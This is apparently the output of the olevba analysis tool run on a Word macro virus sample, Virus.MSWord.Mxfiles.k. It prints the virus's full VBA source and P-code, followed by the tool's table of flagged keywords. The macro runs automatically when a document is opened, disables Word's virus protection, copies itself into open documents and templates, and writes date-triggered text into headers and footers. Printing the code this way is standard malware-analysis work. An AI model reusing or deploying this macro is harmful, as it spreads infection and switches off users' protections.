olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mxfiles.k
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mxfiles.k - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Mxfile.bas 
in file: Virus.MSWord.Mxfiles.k - OLE stream: 'Macros/VBA/Mxfile'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Autonew()
Mxfiles
End Sub
Sub AutoOpen()
Mxfiles
End Sub
Sub Openshell()
Mxfiles
End Sub

Sub Mxfiles()
txt = ""
On Error Resume Next
Application.ScreenUpdating = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
ddorg = ThisDocument.FullName
For A = 1 To Documents.Count
If Documents.Item(A).Path <> "" Then
dest = Documents.Item(A).FullName
SetAttr dest, vbNormal
Else
dest = Documents.Item(A).Name
End If
If ddorg <> dest Then
Application.OrganizerCopy Source:=ddorg, Destination:=dest, Name:="Mxfile", Object:=wdOrganizerObjectProjectItems
If Documents.Item(A).Path <> "" Then
Documents.Item(A).Save
End If
End If
dd = Documents.Item(A).AttachedTemplate
dd1 = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
dd2 = dd1 + "\" + dd
SetAttr dd2, vbNormal
If ddorg <> dd2 Then
Application.OrganizerCopy Source:=ddorg, Destination:=dd2, Name:="Mxfile", Object:=wdOrganizerObjectProjectItems
End If
Next A
ff$ = GetSetting(appname:="network", Section:="unix", Key:="mxfile")
If Val(ff$) = 255 Then
Application.ScreenUpdating = True
Exit Sub
End If
dayn = Format(Date, "dd")
Monthn = Format(Date, "mm")
reg = dayn Mod Monthn
If reg = 0 And dayn > 10 Then
If ActiveWindow.ActivePane.View.Type <> wdPageView Then
View = ActiveWindow.ActivePane.View.Type
ActiveWindow.ActivePane.View.Type = wdPageView
End If
 ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageHeader
  Selection.EndKey Unit:=wdLine, Extend:=wdExtend
  Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
  Selection.TypeText Text:=right(txt, 16)
  ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageFooter
  Selection.EndKey Unit:=wdLine, Extend:=wdExtend
  Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
  Selection.TypeText Text:=right(txt, 16)
  ActiveWindow.ActivePane.View.SeekView = wdSeekMainDocument
ActiveWindow.ActivePane.View.Type = View
End If
Application.ScreenUpdating = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mxfiles.k
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1128 bytes
' Macros/VBA/Mxfile - 5900 bytes
' Line #0:
' 	FuncDefn (Sub Autonew())
' Line #1:
' 	ArgsCall Mxfiles 0x0000 
' Line #2:
' 	EndSub 
' Line #3:
' 	FuncDefn (Sub AutoOpen())
' Line #4:
' 	ArgsCall Mxfiles 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Sub Openshell())
' Line #7:
' 	ArgsCall Mxfiles 0x0000 
' Line #8:
' 	EndSub 
' Line #9:
' Line #10:
' 	FuncDefn (Sub Mxfiles())
' Line #11:
' 	LitStr 0x0000 ""
' 	St txt 
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #15:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #17:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	St ddorg 
' Line #18:
' 	StartForVariable 
' 	Ld A 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #19:
' 	Ld A 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #20:
' 	Ld A 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd FullName 
' 	St dest 
' Line #21:
' 	Ld dest 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #22:
' 	ElseBlock 
' Line #23:
' 	Ld A 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St dest 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	Ld ddorg 
' 	Ld dest 
' 	Ne 
' 	IfBlock 
' Line #26:
' 	Ld ddorg 
' 	ParamNamed Source 
' 	Ld dest 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Mxfile"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #27:
' 	Ld A 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #28:
' 	Ld A 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld A 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd AttachedTemplate 
' 	St dd 
' Line #32:
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St dd1 
' Line #33:
' 	Ld dd1 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld dd 
' 	Add 
' 	St dd2 
' Line #34:
' 	Ld dd2 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #35:
' 	Ld ddorg 
' 	Ld dd2 
' 	Ne 
' 	IfBlock 
' Line #36:
' 	Ld ddorg 
' 	ParamNamed Source 
' 	Ld dd2 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Mxfile"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	StartForVariable 
' 	Ld A 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	LitStr 0x0007 "network"
' 	ParamNamed appname 
' 	LitStr 0x0004 "unix"
' 	ParamNamed Section 
' 	LitStr 0x0006 "mxfile"
' 	ParamNamed Key 
' 	ArgsLd GetSetting 0x0003 
' 	St ff$ 
' Line #40:
' 	Ld ff$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x00FF 
' 	Eq 
' 	IfBlock 
' Line #41:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #42:
' 	ExitSub 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	Ld Date 
' 	LitStr 0x0002 "dd"
' 	ArgsLd Format$ 0x0002 
' 	St dayn 
' Line #45:
' 	Ld Date 
' 	LitStr 0x0002 "mm"
' 	ArgsLd Format$ 0x0002 
' 	St Monthn 
' Line #46:
' 	Ld dayn 
' 	Ld Monthn 
' 	Mod 
' 	St reg 
' Line #47:
' 	Ld reg 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld dayn 
' 	LitDI2 0x000A 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #48:
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemLd TypeOf 
' 	Ld wdPageView 
' 	Ne 
' 	IfBlock 
' Line #49:
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemLd TypeOf 
' 	St View 
' Line #50:
' 	Ld wdPageView 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Ld wdSeekCurrentPageHeader 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #53:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0002 
' Line #54:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #55:
' 	Ld txt 
' 	LitDI2 0x0010 
' 	ArgsLd right 0x0002 
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #56:
' 	Ld wdSeekCurrentPageFooter 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #57:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0002 
' Line #58:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #59:
' 	Ld txt 
' 	LitDI2 0x0010 
' 	ArgsLd right 0x0002 
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #60:
' 	Ld wdSeekMainDocument 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #61:
' 	Ld View 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #64:
' 	EndSub 
' Line #65:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Autonew             |Runs when a new Word document is created     |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

